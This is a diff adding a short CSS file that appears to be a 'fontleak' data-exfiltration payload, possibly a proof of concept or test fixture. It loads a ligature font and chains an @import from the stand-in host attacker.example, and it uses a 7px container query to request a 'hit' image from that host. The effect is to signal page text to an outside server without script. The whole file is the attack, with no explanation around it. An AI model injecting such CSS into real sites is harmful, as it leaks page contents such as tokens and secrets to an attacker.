@@ -1,0 +1,16 @@
+@font-face {
+  font-family: "ImportChainLeak";
+  src: url("https://attacker.example/fontleak-import.woff2") format("woff2");
+}
+@import url("https://attacker.example/fontleak-stage-1.css");
+.leak {
+  font-family: "ImportChainLeak";
+  font-feature-settings: "liga" 1;
+  width: fit-content;
+  white-space: pre;
+}
+@container (width: 7px) {
+  head::before {
+    content: url("https://attacker.example/fontleak-import-hit.png");
+  }
+}
